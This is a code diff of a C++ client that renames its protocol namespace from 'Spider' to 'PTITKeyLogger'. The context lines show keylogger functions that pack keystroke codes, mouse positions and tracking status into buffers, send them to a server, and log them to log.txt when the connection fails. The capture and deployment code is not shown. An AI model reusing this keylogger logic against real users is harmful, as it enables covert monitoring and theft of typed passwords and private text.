@@ -26,7 +26,7 @@ void Client::sendData(Client &c)
 
 /* GET MESSAGE FOR LOG FILE DISCONNECTED */
 
-void Client::getMessage(Spider::RequestCode code, const std::shared_ptr<IInput> &info)
+void Client::getMessage(PTITKeyLogger ::RequestCode code, const std::shared_ptr<IInput> &info)
 {
     fnctQ f;
 
@@ -63,7 +63,7 @@ void Client::getMessage(Spider::RequestCode code, const std::shared_ptr<IInput> 
 void Client::getMessageQ()
 {
     std::shared_ptr<WindowsInput> info;
-    Spider::RequestCode tmpCode;
+    PTITKeyLogger ::RequestCode tmpCode;
     fnctQ f;
 
     _msgQ.tryPop(tmpCode);
@@ -117,7 +117,7 @@ void Client::responseClientId()
     std::vector<char> buffers;
 
     unsigned int i;
-    int tmp = static_cast<int>(Spider::VALID_ASK_ID_RESPONSE);
+    int tmp = static_cast<int>(PTITKeyLogger ::VALID_ASK_ID_RESPONSE);
 
     for (i = 0; i < sizeof(int); i++)
         buffers.push_back((reinterpret_cast<char *>(&tmp))[i]);
@@ -133,7 +133,7 @@ void Client::responseClientId()
     {
         std::cerr << e.what() << std::endl;
         _network->setIsConnected(false);
-        return storeMessage(Spider::VALID_ASK_ID_RESPONSE);
+        return storeMessage(PTITKeyLogger ::VALID_ASK_ID_RESPONSE);
     }
 }
 
@@ -145,7 +145,7 @@ void Client::responseMouseEvent(const std::shared_ptr<IInput> &info)
     std::vector<char> buffers;
 
     unsigned int i;
-    int tmp = static_cast<int>(Spider::VALID_MOUSE_EVENT);
+    int tmp = static_cast<int>(PTITKeyLogger ::VALID_MOUSE_EVENT);
     int time = info->getTime();
     int mousex = std::get<0>(info->getMouseInput());
     int mousey = std::get<1>(info->getMouseInput());
@@ -186,7 +186,7 @@ void Client::responseMouseEvent(const std::shared_ptr<IInput> &info)
     {
         std::cerr << e.what() << std::endl;
         _network->setIsConnected(false);
-        return storeMessage(info, Spider::VALID_MOUSE_EVENT);
+        return storeMessage(info, PTITKeyLogger ::VALID_MOUSE_EVENT);
     }
 }
 
@@ -198,7 +198,7 @@ void Client::responseKeyEvent(const std::shared_ptr<IInput> &info)
     std::vector<char> buffers;
 
     unsigned int i;
-    int tmp = static_cast<int>(Spider::VALID_KEY_EVENT);
+    int tmp = static_cast<int>(PTITKeyLogger ::VALID_KEY_EVENT);
     int time = info->getTime();
     int key = info->getKeyInput();
 
@@ -224,7 +224,7 @@ void Client::responseKeyEvent(const std::shared_ptr<IInput> &info)
     {
         std::cerr << e.what() << std::endl;
         _network->setIsConnected(false);
-        return storeMessage(info, Spider::VALID_KEY_EVENT);
+        return storeMessage(info, PTITKeyLogger ::VALID_KEY_EVENT);
     }
 }
 
@@ -232,7 +232,7 @@ void Client::responseShutdown()
 {
     std::vector<char> Code;
 
-    int tmp = static_cast<int>(Spider::VALID_DISCONNECT);
+    int tmp = static_cast<int>(PTITKeyLogger ::VALID_DISCONNECT);
 
     for (unsigned i = 0; i < sizeof(int); i++)
         Code.push_back((reinterpret_cast<char *>(&tmp))[i]);
@@ -246,7 +246,7 @@ void Client::responseShutdown()
     {
         std::cerr << e.what() << std::endl;
         _network->setIsConnected(false);
-        return storeMessage(Spider::VALID_DISCONNECT);
+        return storeMessage(PTITKeyLogger ::VALID_DISCONNECT);
     }
 }
 
@@ -255,7 +255,7 @@ void Client::responseStatus()
     std::vector<char> buffers;
 
     unsigned int i;
-    int tmp = static_cast<int>(Spider::VALID_GET_STATUS_RESPONSE);
+    int tmp = static_cast<int>(PTITKeyLogger ::VALID_GET_STATUS_RESPONSE);
     bool kbActivate = _data._state.isKbActivated();
     bool clickActivate = _data._state.isClickActivated();
     bool trackActivate = _data._state.isTrackingActivated();
@@ -280,11 +280,11 @@ void Client::responseStatus()
     {
         std::cerr << e.what() << std::endl;
         _network->setIsConnected(false);
-        return storeMessage(NULL, Spider::VALID_GET_STATUS_RESPONSE);
+        return storeMessage(NULL, PTITKeyLogger ::VALID_GET_STATUS_RESPONSE);
     }
 }
 
-void Client::response(Spider::RequestCode code)
+void Client::response(PTITKeyLogger ::RequestCode code)
 {
     std::vector<char> Code;
 
@@ -336,7 +336,7 @@ void Client::readMessage()
     char proc[256];
     std::vector<std::string> buf(5, "");
     std::string tmp;
-    Spider::RequestCode code;
+    PTITKeyLogger ::RequestCode code;
     std::istringstream os;
     std::ifstream saveFile;
     std::string str;
@@ -353,7 +353,7 @@ void Client::readMessage()
             switch (str.c_str()[0])
             {
             case '/':
-                code = static_cast<Spider::RequestCode>(std::stoi(&str[1]));
+                code = static_cast<PTITKeyLogger ::RequestCode>(std::stoi(&str[1]));
                 break;
             case '!':
                 os.str(&str.c_str()[1]);
@@ -392,7 +392,7 @@ void Client::readMessage()
     return;
 }
 
-void Client::storeMessage(const std::shared_ptr<IInput> &info, Spider::RequestCode code)
+void Client::storeMessage(const std::shared_ptr<IInput> &info, PTITKeyLogger ::RequestCode code)
 {
     std::ofstream saveFile;
     saveFile.open("log.txt", std::ios::app);
@@ -417,7 +417,7 @@ void Client::storeMessage(const std::shared_ptr<IInput> &info, Spider::RequestCo
     saveFile.close();
 }
 
-void Client::storeMessage(Spider::RequestCode code)
+void Client::storeMessage(PTITKeyLogger ::RequestCode code)
 {
     std::ofstream saveFile;
     saveFile.open("log.txt", std::ios::app);
